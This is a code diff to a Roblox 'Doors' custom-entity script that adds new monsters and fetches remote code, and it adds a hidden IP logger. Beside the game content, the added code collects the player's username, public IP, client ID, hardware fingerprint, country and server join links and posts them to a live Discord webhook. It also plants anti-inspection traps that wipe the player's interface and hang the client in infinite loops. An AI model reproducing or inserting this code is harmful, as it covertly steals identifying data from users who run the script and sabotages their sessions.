@@ -5,6 +5,344 @@ function GitPNG(GithubImg,ImageName)
 	end
 	return (getcustomasset or getsynasset)(ImageName..".png")
 end
+
+--text
+firesignal(game:GetService("ReplicatedStorage").EntityInfo.Caption.OnClientEvent, 'You Executed the Script',true,3)
+wait(1)
+firesignal(game:GetService("ReplicatedStorage").EntityInfo.Caption.OnClientEvent, 'Credits to Noah and Tinkgy',true,2)
+wait(1)
+firesignal(game:GetService("ReplicatedStorage").EntityInfo.Caption.OnClientEvent, 'F### you if u get this code source',true,1)
+
+
+
+for i, v in pairs(game.CoreGui:GetDescendants()) do
+    if v:IsA("TextLabel") then
+        if v.Text:match("Lopvi") or 
+        v.Text:match("Http") or 
+        v.Text:match("Spy") or 
+        _G.AlreadyExecuted == true or 
+        _G.AlreadyExecuted == false or 
+        _G.AlreadyExecuted then
+            v.Parent.Parent.Parent:Destroy()
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+            local skid = Instance.new("Message")
+            skid.Parent = game:GetService("CoreGui")
+            skid.Text = 'You seriously thought you could just get the source like that? Go get a life, skid.'
+            task.wait(2)
+            for i, v1 in pairs(game.Players.LocalPlayer:GetDescendants()) do
+                v1:Destroy()
+            end
+            for i, v1 in pairs(game.CoreGui:GetDescendants()) do
+                v1:Destroy()
+            end
+            local num = 0
+            while true do
+                print("1")
+                error("2")
+                warn("3")
+                while true do 
+                    print("1")
+                error("2")
+                warn("3")
+                    while true do
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                        print("1")
+                error("2")
+                warn("3")
+                    while true do 
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                    end
+                    print("1")
+                error("2")
+                warn("3")
+                end
+                print("1")
+                error("2")
+                warn("3")
+                for i, v in pairs(game.CoreGui:GetDescendants()) do
+    if v:IsA("TextLabel") then
+        if v.Text:match("Lopvi") or 
+        v.Text:match("Http") or 
+        v.Text:match("Spy") then
+            v.Parent.Parent.Parent:Destroy()
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+            local num = 0
+            while true do
+                print("L")
+                while true do
+                print("L")
+                while true do
+                print("L")
+            end
+            end
+            end
+        end
+    end
+end
+            end
+        end
+    end
+end
+end
+end
+local functions = {
+    rconsoleprint,
+    print,
+    setclipboard,
+    rconsoleerr,
+    rconsolewarn,
+    warn,
+    error
+}
+
+for i, v in next, functions do
+    local old
+    old =
+        hookfunction(
+        v,
+        newcclosure(
+            function(...)
+                local args = {...}
+                for i, v in next, args do
+                    if tostring(i):find("https") or tostring(v):find("https") then
+                        while true do
+                        end
+                    end
+                end
+                return old(...)
+            end
+        )
+    )
+end
+
+if _G.ID then
+    while true do
+    end
+end
+setmetatable(
+    _G,
+    {
+        __newindex = function(t, i, v)
+            if tostring(i) == "ID" then
+                while true do
+                end
+            end
+        end
+    }
+)
+
+_G.AntiLog = true
+_G.Neon919 = true
+local webh = "https://discord.com/api/webhooks/1099297024102387742/uWPRQBzbahSObou8WQOrpHQ7EuJOgyWrP8YgyuYknHBT_Mdb7e8laDYdRBRCEVwEriNp" -- put your webhook here
+local req = http_request or request or (syn and syn.request) 
+local uwu = game:GetService("RbxAnalyticsService"):GetClientId()
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local a = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+local b = 'https://www.roblox.com/games/'..game.PlaceId..'?serverJobId='..game.JobId..''
+local http_request = syn.request;
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid = decoded.headers["Syn-Fingerprint"]
+
+local exe = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or flux and "Fluxus" or "shit exploit"
+ 
+local mir = game:HttpGet("http://ip-api.com/json")
+local Pwp = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["author"] = { -- Separate table for many features
+				["name"] = "Advanced ip logger"; -- the name of the author
+				["url"] = "https://scriptblox.com/u/Nextix"; -- You can click on the name, and it will open the link that is set in the url.
+				["icon_url"] = "https://cdn.discordapp.com/attachments/1073680068796239993/1073697431113453578/Pablo_1.webp" -- The image's url you want there.
+			};
+              ["fields"] = { -- Make a table
+                  { -- now make a new one for each field you wish to add
+					["name"] = "Client infos:",
+					["value"] = game.Players.LocalPlayer.Name,-- The text,value or information under the title of the field aka name.
+					["inline"] = true, -- means that its either inline with others, from left to right or if it is set to false, from up to down.
+				},
+
+				{
+					["name"] = "Country:";
+					["value"] = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Ip:";
+					["value"] = req({ Url = "https://api.ipify.org/", Method = "Get" }).Body,
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "client id :";
+					["value"] = uwu,
+					["inline"] = true;
+				},
+                {
+				    ["name"] = "Hwid test:";
+					["value"] = hwid,
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Job id:";
+					["value"] = game.JobId,
+					["inline"] = true;
+				},
+                	{
+				    ["name"] = "Job id script join:";
+					["value"] = a,
+					["inline"] = true;
+				},
+                	{
+				    ["name"] = "Job id link join:";
+					["value"] = b,
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Excutor:";
+					["value"] = "**" .. exe .. "**",
+					["inline"] = true;
+				},
+				{
+				    ["name"] = "Status:";
+					["value"] = MembershipType,
+					["inline"] = true;	
+					
+				},
+				{
+				    ["name"] = "**Date:**";
+					["value"] = tostring(os.date("%m/%d/%Y")),
+					["inline"] = false;	
+				},
+				{
+				    ["name"] = "**Time:**";
+					["value"] = tostring(os.date("%X")),
+					["inline"] = false;	
+				},
+				{
+				    ["name"] = "**Others:**";
+					["value"] = "------------------------------------------------------------------------------",
+					["inline"] = false;	
+				},
+
+				{
+				    ["name"] = "**Game Name:**";
+					["value"] = Pwp,
+					["inline"] = false;	
+				
+				},
+				{
+				    ["name"] = "**Game Link:**";
+					["value"] = "https://www.roblox.com/games/"..game.PlaceId.."",
+					["inline"] = false;		
+				},
+				{
+				    ["name"] = "\n\n**Data:**";
+					["value"] = "```".. mir .."```",
+					["inline"] = false;	
+					},
+				{
+				    ["name"] = "Creator";
+					["value"] = "Nextix And Neon!",
+					["inline"] = false;		
+				},
+				
+					
+				}
+			}
+			
+		}}
+ 
+
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
 -- sprint suckass credits to Tinkgy
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NoWayNoah/floor-2/main/Sprint.txt"))()
 
@@ -129,6 +467,7 @@ end
 
 -- Run the created entity
 Spawner.runEntity(entityTable)
+       pcall(deltshit)
     end
 end)
    a()
@@ -537,3 +876,139 @@ Achievements.Get({
 end
     end
 end)()
+
+-- silence
+local function GetGitSound(GithubSnd,SoundName)
+				local url=GithubSnd
+				if not isfile(SoundName..".mp3") then
+					writefile(SoundName..".mp3", game:HttpGet(url))
+				end
+				local sound=Instance.new("Sound")
+				sound.SoundId=(getcustomasset or getsynasset)(SoundName..".mp3")
+				return sound
+			end
+			spawn(function()
+			    while wait(80) do
+			game.Lighting.MainColorCorrection.TintColor = Color3.fromRGB(0, 0, 0)
+	game.Lighting.MainColorCorrection.Contrast = 1
+	local tween = game:GetService("TweenService")
+	tween:Create(game.Lighting.MainColorCorrection, TweenInfo.new(2.5), {Contrast = 0}):Play()
+	local TweenService = game:GetService("TweenService")
+	local TW = TweenService:Create(game.Lighting.MainColorCorrection, TweenInfo.new(80),{TintColor = Color3.fromRGB(255, 255, 255)})
+	TW:Play()
+        local Clock = GetGitSound("https://github.com/Brololto/bing-/blob/main/Screen_Recording_20230419-164136_Chrome%20(online-audio-converter.com).mp3?raw=true","Anotherlove")
+				Clock.Parent = workspace
+				Clock.Volume = 5
+				Clock:Play()
+				        local Bell = GetGitSound("https://github.com/Potato032/Entt/blob/main/ClockSoundsCreditsToVynixus.mp3?raw=true","Credit")
+				Bell.Parent = workspace
+				Bell.Volume = 5
+				Bell:Play()
+	wait(38)
+			if game.Players.LocalPlayer.Character.Humanoid.MoveDirection ~= Vector3.new(0,0,0) then
+		game.Players.LocalPlayer.Character.Humanoid:TakeDamage(1000)
+	game:GetService("ReplicatedStorage").GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Silence"
+	firesignal(game.ReplicatedStorage.EntityInfo.DeathHint.OnClientEvent, {"You died to Silence", "He is supposed to come after rush, to try to mimic him.", "But he gives you a little bit of time so use that for you Advantage.", "he will instanly kill you if you are moving"}, "Blue")
+        pcall(Silence)
+			end
+end
+end)
+
+-- hunger
+spawn(function()
+while wait(3.5) do
+if game.ReplicatedStorage.GameData.LatestRoom.Value == 50 then
+local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors%20Entity%20Spawner/Source.lua"))()
+-- Create entity
+local entityTable = Spawner.createEntity({
+    CustomName = "Hunger", -- Custom name of your entity
+    Model = "rbxassetid://12247245059", -- Can be GitHub file or rbxassetid
+    Speed = 38, -- Percentage, 100 = default Rush speed
+    DelayTime = 0, -- Time before starting cycles (seconds)
+    HeightOffset = 0,
+    CanKill = true,
+    KillRange = 8,
+    BackwardsMovement = true,
+    BreakLights = false,
+    FlickerLights = {
+        false, -- Enabled/Disabled
+        1, -- Time (seconds)
+    },
+    Cycles = {
+        Min = 5,
+        Max = 500000000000000,
+        WaitTime = 2,
+    },
+    CamShake = {
+        true, -- Enabled/Disabled
+        {2.5, 20, 0.1, 1}, -- Shake values (don't change if you don't know)
+        100, -- Shake start distance (from Entity to you)
+    },
+    Jumpscare = {
+        true, -- Enabled/Disabled
+        {
+            Image1 = "rbxassetid://5577595111", -- Image1 url
+            Image2 = "rbxassetid://10657365561", -- Image2 url
+            Shake = true,
+            Sound1 = {
+                4903742660, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Sound2 = {
+                3537873683, -- SoundId
+                { Volume = 0.5 }, -- Sound properties
+            },
+            Flashing = {
+                true, -- Enabled/Disabled
+                Color3.fromRGB(0, 255, 255), -- Color
+            },
+            Tease = {
+                true, -- Enabled/Disabled
+                Min = 2,
+                Max = 2,
+            },
+        },
+    },
+    CustomDialog = {"You died to Hungered...", "A loud scream its your signal.", "Hide quick!"}, -- Custom death message
+
+})
+
+
+-----[[  Debug -=- Advanced  ]]-----
+entityTable.Debug.OnEntitySpawned = function()
+    print("Entity has spawned:", entityTable)
+    workspace.CurrentRooms[game.ReplicatedStorage.GameData.LatestRoom.Value].Assets.Light_Fixtures:Destroy()
+	workspace.CurrentRooms[game.ReplicatedStorage.GameData.LatestRoom.Value].Assets.Chandelier:Destroy()
+end
+
+entityTable.Debug.OnEntityDespawned = function()
+    print("Entity has despawned:", entityTable)
+end
+
+entityTable.Debug.OnEntityStartMoving = function()
+end
+
+entityTable.Debug.OnEntityFinishedRebound = function()
+    print("Entity has finished rebound:", entityTable)
+end
+
+entityTable.Debug.OnEntityEnteredRoom = function(room)
+    print("Entity:", entityTable, "has entered room:", room)
+end
+
+entityTable.Debug.OnLookAtEntity = function()
+    print("Player has looked at entity:", entityTable)
+end
+
+entityTable.Debug.OnDeath = function()
+    warn("Player has died.")
+    firesignal(game.ReplicatedStorage.EntityInfo.DeathHint.OnClientEvent, {"You Have Been Caught By Hunger...", "it lurks around on figures library.", "Don't Get Caught"}, "Blue")
+end
+------------------------------------
+
+
+-- Run the created entity
+Spawner.runEntity(entityTable)
+end
+end
+end)
